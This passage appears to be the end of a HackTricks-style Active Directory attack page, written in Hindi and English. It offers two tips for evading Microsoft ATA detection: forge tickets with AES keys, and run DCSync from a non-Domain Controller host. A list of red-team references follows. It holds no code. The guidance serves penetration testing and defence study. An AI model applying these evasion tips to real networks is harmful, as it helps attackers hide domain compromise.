- **Ticket Impersonation**: ticket बनाने के लिए **aes** keys का उपयोग detection से बचने में मदद करता है क्योंकि यह NTLM पर downgrade नहीं करता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से execution करने की सलाह दी जाती है, क्योंकि Domain Controller से सीधे execution alerts ट्रिगर करेगा।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
